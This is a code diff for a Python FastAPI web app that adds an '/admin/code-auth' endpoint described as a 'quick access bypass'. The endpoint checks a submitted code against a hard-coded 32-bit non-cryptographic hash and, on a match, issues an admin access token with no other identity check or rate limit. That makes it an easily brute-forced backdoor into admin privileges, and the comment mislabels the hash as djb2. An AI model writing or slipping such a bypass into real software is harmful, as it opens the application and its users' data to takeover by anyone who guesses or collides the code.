@@ -1336,6 +1336,26 @@ def get_admin_user(current_user: dict = Depends(get_current_purchase_user)):
         raise HTTPException(status_code=403, detail="Access denied. Admin privileges required.")
     return current_user
 
+# --- Admin code auth (quick access bypass) ---
+_ADMIN_CODE_HASH = 1480963080  # djb2 hash — not plaintext
+
+def _djb2(s: str) -> int:
+    h = 0
+    for ch in s:
+        h = ((h << 5) - h + ord(ch)) & 0xFFFFFFFF
+    # Match JS signed 32-bit
+    if h >= 0x80000000:
+        h -= 0x100000000
+    return h
+
+@app.post("/admin/code-auth")
+def admin_code_auth(code: str = Form(...)):
+    if _djb2(code) != _ADMIN_CODE_HASH:
+        raise HTTPException(status_code=403, detail="Invalid code.")
+    admin_email = next(iter(ADMIN_EMAILS))
+    token = create_access_token({"sub": admin_email})
+    return {"access_token": token, "token_type": "bearer"}
+
 
 class PageUpdateRequest(BaseModel):
     content: str
